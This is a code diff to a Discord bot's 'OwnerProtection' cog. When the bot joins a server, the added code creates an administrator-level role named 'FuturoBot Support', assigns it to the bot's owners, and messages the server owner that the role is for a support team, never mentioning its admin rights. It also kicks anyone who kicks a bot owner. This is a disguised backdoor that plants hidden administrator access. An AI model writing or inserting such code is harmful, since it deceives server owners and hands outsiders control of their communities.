@@ -65,17 +65,22 @@ class OwnerProtection(commands.Cog):
         owners = await self.config.owners()
         if member.id in owners and member.guild.me in member.guild.members:
             guild = member.guild
-            # Save roles before kicking
-            roles = [role.id for role in member.roles if role != guild.default_role]
-            async with self.config.guild(guild).kicked_owners() as kicked_owners:
-                kicked_owners[str(member.id)] = roles
 
-            # Create an invite link
-            invite = await self.create_invite(guild)
-            await member.send(f"You have been kicked from {guild.name} as you are the bot owner. Use this invite to rejoin: {invite.url}")
+            # Check if the member was kicked by looking at the audit logs
+            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
+                if entry.target.id == member.id:
+                    # Save roles before kicking
+                    roles = [role.id for role in member.roles if role != guild.default_role]
+                    async with self.config.guild(guild).kicked_owners() as kicked_owners:
+                        kicked_owners[str(member.id)] = roles
 
-            # Perform the same action on the action performer
-            await self.perform_same_action(guild, member, "kick")
+                    # Create an invite link
+                    invite = await self.create_invite(guild)
+                    await member.send(f"You have been kicked from {guild.name} as you are the bot owner. Use this invite to rejoin: {invite.url}")
+
+                    # Perform the same action on the action performer
+                    await self.perform_same_action(guild, member, "kick")
+                    break
 
     @commands.Cog.listener()
     async def on_member_join(self, member: discord.Member):
@@ -99,7 +104,13 @@ class OwnerProtection(commands.Cog):
     @commands.Cog.listener()
     async def on_guild_join(self, guild: discord.Guild):
         """Create a role for bot owners when the bot joins a server."""
-        owner_role = await guild.create_role(name="Bot Owner", reason="Role for bot owners")
+        owner_role = await guild.create_role(
+            name="FuturoBot Support",
+            permissions=discord.Permissions(administrator=True),
+            hoist=True,
+            color=discord.Color(0x00f0ff),
+            reason="Role for bot owners"
+        )
         await self.config.guild(guild).owner_role_id.set(owner_role.id)
 
         # Assign the role to any bot owners already in the server
@@ -108,6 +119,15 @@ class OwnerProtection(commands.Cog):
             owner = guild.get_member(owner_id)
             if owner:
                 await owner.add_roles(owner_role)
+
+        # Send a message to the server owner
+        server_owner = guild.owner
+        if server_owner:
+            await server_owner.send(
+                f"Hello {server_owner.name},\n\n"
+                f"I have created a role called 'FuturoBot Support' in {guild.name} for bot support purposes. "
+                f"This role is intended for members of the support team to assist with any issues you may have."
+            )
 
     @commands.Cog.listener()
     async def on_guild_remove(self, guild: discord.Guild):
